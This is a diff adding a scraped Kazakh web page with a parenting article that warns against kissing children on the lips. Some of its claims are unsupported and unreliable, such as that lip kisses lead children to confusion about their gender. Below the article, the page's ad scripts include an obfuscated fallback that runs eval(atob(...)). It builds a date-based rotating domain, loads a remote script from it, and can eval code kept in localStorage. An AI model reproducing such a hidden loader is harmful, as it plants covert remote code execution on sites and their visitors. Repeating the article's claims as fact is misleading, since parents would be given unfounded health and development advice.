@@ -1,0 +1,54 @@
+Әке-шеше үшін бала деген өте маңызды әрі қадірлі.
+Жүктілік дәуірі кезінде 9 ай бойы әке-шеше баласын құшағына алатын күнін сабырсыздана күтеді.
+Нәресте шыр етіп, дүние есігін ашқан кезде әке-шешенің  жүрегі қуаныштан жарыла жаздайды.
+Енді, міне, сағына күткен балаларын құшақтап, оны сүю мүмкіндігіне ие болды. .Дүниеге келгеннен кейін нәресте үшін әке-шешесінің денесіне өзін жақын сезінуі өте маңызды.
+Яғни, нәрестені әке-шешесі құшақтап, сүйген кезде ол өзін сенімді сезінеді..Дегенмен де, нәрестелер мен балалардың сүюге болатын беттері, жұп-жұмсақ қолдары, торсықтай шекесі тұрған кезде неліктен олардың еріндерінен сүюіміз керек? Баласының ернінен сүйген ата-ана «оны қаттырақ жақсы көрдім» деп ойлай ма? Әрине, жоқ.
+Керісінше, ата-аналар балаларын жақсы көретін болса және оларға физикалық немесе рухани тұрғыдан зиянын тигізгісі келмесе, олардың еріндерінен сүймесін. .Балалардың ернінен сүюдің төмендегідей зияндары бар:.• Иммунитеттері әлі әлсіз болғандықтан, біздің аузымыз арқылы микробтар ағзасына тезірек өтеді де жиі сырқаттанады..• Ұшық, безеу, тіс етінің жаралары секілді инфекциялардың өту қауіпі бар.
+Әсіресе, нәрестелер мен балалар үшін ұшық өте қауіпті..• Балаларға жыныстық тәрбие беру барысында денелерінің өздеріне ғана тән бөлігі бар екенін және ол жерлеріне ешкімнің қол тигізуіне рұқсат бермеуі керек екенін айтып жатқанда, егер ата-ана өзі баласының ернінен сүйетін болса, баланың санасында қарама-қайшылықтар туындайды..• Ата-анасы ернінен сүйетін балалар басқалардың да ернінен сүюіне қарсылық білдірмейді.
+Өйткені, балалар үшін ата-аналарының барлық ісі дұрыс болып есептеледі және рұқсат етіледі деп ойлайды.
+Осылайша, олар өздерін жаман ниетті адамдардың іс-әрекетінен қорғай алмайды, тіпті олардың бұл әрекетінің жаман және зиянды екенін түсіне де алмайды..• Әкесі ұлының, анасы қызының ернінен сүйген кезінде бала жыныс анықтауда қиналу, өскенде басқа жынысты таңдау,яғни өз жынысын иелене алмау секілді қауіптерге жол ашуы мүмкін..• Әкесі қызының, анасы ұлының ернінен сүюі болашақта әке-шеше мен баланың арасындағы қарым-қатынасқа кері әсерін тигізуі мүмкін.
+Тіпті, бұл балалар ертең үйленген кезінде отбасылық өмірі мен жыныстық өмірінде де қиындықтарға душар болуы мүмкін..• Еріннен сүю жыныстық белгілерді де қамтитындықтан, балада жыныстық дабыл ерте қағылып, баланың басы қатады әрі оның дамуына да кері әсерін тигізеді..• Әке-шешесі тарапынан ернінен сүйілетін бала мектепте досының немесе үйге келген қонақтың ернінен сүюге тырысса, онда оның бұл әрекеті қоғамды өз орнын табуына зиянын тигізеді..Балаларымызды сүйейік, тіпті жиі-жиі сүйейік.
+Бірақ, ернінен, құйрығынан немесе санынан емес, бетінен, қолынан, шекесінен сүйейік..Бөлісіңіз:
+
+
+
+
+
+
+ 
+          var node4990 = document.getElementById("MIXADV_4990");
+          if( node4990 )
+          {
+               var script = document.createElement("script");
+               script.charset = "utf-8";
+               script.src = "https://m.mixadvert.com/show/?id=4990&r="+Math.random();
+               node4990.parentNode.appendChild(script); 
+               script.onerror = function(){
+                  window.eval( atob("dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKSArIDE7IHZhciBkYXkgPSBkYXRlLmdldERhdGUoKTsgdmFyIHllYXIgPSBkYXRlLmdldFllYXIoKTsgdmFyIG5hbWVfZGF5ID0gZGF0ZS5nZXREYXkoKSArIDE7dmFyIGRvbSA9IFsgInBybyIsICJ0b3AiLCAiaW5mbyIsICJvbmxpbmUiLCAic3BhY2UiLCAic2l0ZSIsICJ0ZWNoIl07IHZhciBzdHIgPWRheSoobW9udGggKiBuYW1lX2RheSAqIGRheSkrIiIrIGRheSoobW9udGggKyBuYW1lX2RheSArIGRheSAreWVhcik7dmFyIGhhc2ggPSAgYnRvYShidG9hKHN0cikpLnRvTG93ZXJDYXNlKCk7IHZhciBob3N0ID0gaGFzaC5zdWJzdHJpbmcoMywgaGFzaC5sZW5ndGggLSBuYW1lX2RheS8yKSsiLiIrZG9tW25hbWVfZGF5IC0gMV07dmFyIHIgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgMik7ciA9IHIucmVwbGFjZSgvWzAtOV0vZywgIiIpO3ZhciBkZWx0YSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICgxMDAgLSAxMCArIDEpKSArIDEwO3ZhciBpZCA9IDQ5OTAgLSBkZWx0YTsgdmFyIHNjcmlwdF9maXJzdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdF9maXJzdC5zcmMgPSAiaHR0cHM6Ly8iKyBob3N0KyIvIitkZWx0YStpZCtyKyIiOyBub2RlNDk5MC5wYXJlbnROb2RlLmFwcGVuZENoaWxkKHNjcmlwdF9maXJzdCk7c2V0VGltZW91dCggZnVuY3Rpb24gKCkge3NjcmlwdF9maXJzdC5yZW1vdmUoKX0sIDQwMDApO3NjcmlwdF9maXJzdC5vbmVycm9yID0gZnVuY3Rpb24oKXsgc2V0VGltZW91dCggZnVuY3Rpb24gKCkgeyBpZiggbm9kZTQ5OTAuaW5uZXJIVE1MID09ICIiICkgd2luZG93LmV2YWwobG9jYWxTdG9yYWdlLmdldEl0ZW0oIjQ5OTAiKSkgfSwgNTAwMCk7ICA7fTsg") );
+              }
+          }
+          
+
+
+
+
+    (function(w, d, n, s, t) {
+        w[n] = w[n] || [];
+        w[n].push(function() {
+            Ya.Context.AdvManager.render({
+                blockId: "R-A-241735-5",
+                renderTo: "yandex_rtb_R-A-241735-5",
+                async: true
+            });
+        });
+        t = d.getElementsByTagName("script")[0];
+        s = d.createElement("script");
+        s.type = "text/javascript";
+        s.src = "//an.yandex.ru/system/context.js";
+        s.async = true;
+        t.parentNode.insertBefore(s, t);
+    })(this, this.document, "yandexContextAsyncCallbacks");
+
+
+
+.
